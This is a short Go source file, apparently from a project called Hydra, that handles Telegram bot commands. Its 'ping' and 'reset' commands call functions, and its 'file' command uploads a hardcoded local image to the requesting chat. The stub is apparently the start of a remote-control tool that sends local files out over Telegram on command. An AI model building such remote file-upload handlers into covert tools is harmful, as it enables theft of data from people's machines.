package commands

import (
	"fmt"

	"github.com/Raffy27/Hydra/api"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

func Perform(message *tgbotapi.Message) {
	switch message.Command() {
	case "ping":
		Ping()
	case "reset":
		Reset()
	case "file":
		wha, err := api.Bot.UploadFile("sendPhoto", map[string]string{
			"chat_id": fmt.Sprint(message.Chat.ID),
		}, "photo", "C:\\Users\\Raffy\\Desktop\\wha.png")
		fmt.Println(err)
		fmt.Println(wha)
	}
}
